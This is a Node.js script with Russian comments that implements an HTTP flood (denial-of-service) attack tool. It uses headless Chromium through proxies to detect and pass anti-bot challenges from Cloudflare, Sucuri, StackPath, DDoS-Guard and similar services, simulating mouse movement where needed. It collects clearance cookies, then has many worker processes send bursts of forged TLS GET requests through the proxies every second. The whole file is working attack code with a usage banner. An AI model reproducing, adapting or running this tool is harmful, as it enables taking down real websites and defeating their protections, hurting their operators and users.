const { chromium } = require('playwright');
const urlLib = require('url');
const { SSL_OP_NO_SSLv3, SSL_OP_NO_SSLv2 } = require('crypto').constants;
const cluster = require("cluster");
const http = require('http');
const tls = require('tls');
const os = require('os');

// Обработка непредвиденных исключений и отклоненных обещаний
process.on('uncaughtException', function (error) {
    console.error('Unhandled exception:', error);
});
process.on('unhandledRejection', function (error) {
    console.error('Unhandled rejection:', error);
});

// Получение параметров командной строки с проверками
if (process.argv.length < 6) {
    console.log('Usage: node script.js [target] [delay] [threads] [proxy_list]');
    process.exit(1);
}

const targetUrl = process.argv[2];
const delayTime = parseInt(process.argv[3], 10);
const threadCount = parseInt(process.argv[4], 10);
const proxyList = process.argv[5].split(",");

// Проверка валидности URL
if (!isValidUrl(targetUrl)) {
    console.error('Invalid URL provided');
    process.exit(1);
}

// Проверка количества потоков
if (isNaN(threadCount) || threadCount <= 0) {
    console.error('Invalid number of threads');
    process.exit(1);
}

// Проверка корректности задержки
if (isNaN(delayTime) || delayTime <= 0) {
    console.error('Invalid delay time');
    process.exit(1);
}

if (cluster.isMaster) {
    for (let i = 0; i < threadCount; i++) {
        cluster.fork();
        console.log(`${i + 1} Поток запущен`);
    }
    setTimeout(() => {
        process.exit(0);
    }, delayTime * 1000);
} else {
    console.log('Запуск браузера!');
    startSolver({
        "Target": targetUrl,
        "Duration": delayTime,
        "Rate": 10000,
        "Proxy": getRandomProxy(proxyList)
    });
}

// Проверка валидности URL
function isValidUrl(string) {
    try {
        new URL(string);
        return true;
    } catch (_) {
        return false;
    }
}

// Выбор случайного прокси из списка
function getRandomProxy(array) {
    return array[Math.floor(Math.random() * array.length)];
}

const scriptList = {
    "js": [
        {
            "name": "CloudFlare (Secure JS)",
            "navigations": 2,
            "locate": "<h2 class=\"h2\" id=\"challenge-running\">"
        },
        {
            "name": "CloudFlare (Normal JS)",
            "navigations": 2,
            "locate": "<div class=\"cf-browser-verification cf-im-under-attack\">"
        },
        {
            "name": "BlazingFast v1.0",
            "navigations": 1,
            "locate": "<br>DDoS Protection by</font> Blazingfast.io</a>"
        }, 
        {
            "name": "BlazingFast v2.0",
            "navigations": 1,
            "locate": "Verifying your browser, please wait...<br>DDoS Protection by</font> Blazingfast.io</a></h1>"
        }, 
        {
            "name": "Sucuri",
            "navigations": 4,
            "locate": "<html><title>You are being redirected...</title>"
        }, 
        {
            "name": "StackPath",
            "navigations": 4,
            "locate": "<title>Site verification</title>"
        }, 
        {
            "name": "StackPath EnforcedJS",
            "navigations": 4,
            "locate": "<title>StackPath</title>"
        }, 
        {
            "name": "React",
            "navigations": 1,
            "locate": "Check your browser..."
        }, 
        {
            "name": "DDoS-Guard",
            "navigations": 1,
            "locate": "DDoS protection by DDos-Guard"
        }, 
        {
            "name": "VShield",
            "navigations": 1,
            "locate": "fw.vshield.pro/v2/bot-detector.js"
        }, 
        {
            "name": "GameSense",
            "navigations": 1,
            "locate": "<title>GameSense</title>"
        }, 
        {
            "name": "PoW Shield",
            "navigations": 1,
            "locate": "<title>PoW Shield</title>"
        }
    ]
};


// Конвертация cookies в строку
function cookiesToString(cookies) {
    return Array.isArray(cookies)
        ? cookies.reduce((acc, { name, value }) => acc ? `${acc}; ${name}=${value}` : `${name}=${value}`, "")
        : "";
}

// Определение типа JS
function detectJS(content) {
    for (const script of scriptList['js']) {
        if (content.includes(script.locate)) {
            return script;
        }
    }
}

// Запуск решения
async function startSolver(args) {
    try {
        const browser = await chromium.launch({
            headless: true,
            proxy: { server: 'http://' + args.Proxy }
        });
        const page = await browser.newPage();

        try {
            await page.goto(args.Target);
        } catch (error) {
            console.error('Error navigating to target:', error);
            await browser.close();
            return;
        }

        const userAgent = await page.evaluate(() => navigator.userAgent);
        console.log(`UA: ${userAgent}`);

        for (let attempt = 0; attempt < 5; attempt++) {
            const pageContent = await page.content();
            const pageTitle = await page.title();
            const detectedJS = detectJS(pageContent);

            if (pageTitle === "Access denied") {
                console.log(`Прокси заблокирован!`);
                break;
            }
            if (detectedJS) {
                console.log(`Обнаружено ${detectedJS.name}`);
                if (detectedJS.name === "VShield") {
                    await simulateMouseMovement(page);
                }
                for (let i = 0; i < detectedJS.navigations; i++) {
                    await page.waitForNavigation();
                    console.log(`Ожидание перенаправления ${i + 1}`);
                }
            }
        }

        const cookies = cookiesToString(await page.context().cookies());
        console.log(`Cookies: ${cookies}`);
        await browser.close();
        initiateFlood(args, userAgent, cookies);
    } catch (error) {
        console.error('Error in solver:', error);
    }
}

// Имитация движения мыши для обхода защиты
async function simulateMouseMovement(page) {
    await page.mouse.move(randomInt(0, 100), randomInt(0, 100));
    await page.mouse.down();
    await page.mouse.move(randomInt(0, 100), randomInt(0, 100));
    await page.mouse.move(randomInt(0, 100), randomInt(0, 100));
    await page.mouse.move(randomInt(100, 200), randomInt(100, 200));
    await page.mouse.up();
}

// Инициация атаки
function initiateFlood(args, userAgent, cookies) {
    console.log('Начало атаки!');
    const parsedUrl = urlLib.parse(args.Target);
    setInterval(() => {
        const req = http.request({
            host: args.Proxy.split(':')[0],
            port: args.Proxy.split(':')[1],
            method: 'CONNECT',
            path: `${parsedUrl.host}:443`
        });

        req.on('connect', (res, socket) => {
            const tlsConnection = tls.connect({
                host: parsedUrl.host,
                servername: parsedUrl.host,
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', SSL_OP_NO_SSLv3, SSL_OP_NO_SSLv2],
                secure: true,
                requestCert: true,
                honorCipherOrder: true,
                secureOptions: SSL_OP_NO_SSLv3,
                rejectUnauthorized: false,
                socket: socket
            }, () => {
                for (let j = 0; j < 256; j++) {
                    tlsConnection.write(`GET / HTTP/1.1\r\nHost: ${parsedUrl.host}\r\nUser-Agent: ${userAgent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nCookie: ${cookies}\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n`);
                }
                tlsConnection.end();
            });

            tlsConnection.on('error', (error) => {
                console.error('Error in TLS connection:', error);
            });

            tlsConnection.on('data', (data) => {
                if (data.includes("403 Forbidden") || data.includes("429 Too Many")) {
                    tlsConnection.end();
                }
            });
        });

        req.on('error', (error) => {
            console.error('Error in HTTP request:', error);
        });

        req.end();
    }, 1000);
}

// Генерация случайного числа в диапазоне
function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

console.log(`
\x1b[93m╭────────────────────━━━━━━━━━━━━━━━━━━━━━────────────────╮
| \x1b[92mИспользование: node main.js [target_url] [delay_seconds] [threads] [proxy_list] \x1b[93m|
| \x1b[92mПример: node main.js http://example.com 60 4 192.168.0.1:8080,192.168.0.2:8080 \x1b[93m|
╰────────────────────━━━━━━━━━━━━━━━━━━━━━────────────────╯
`);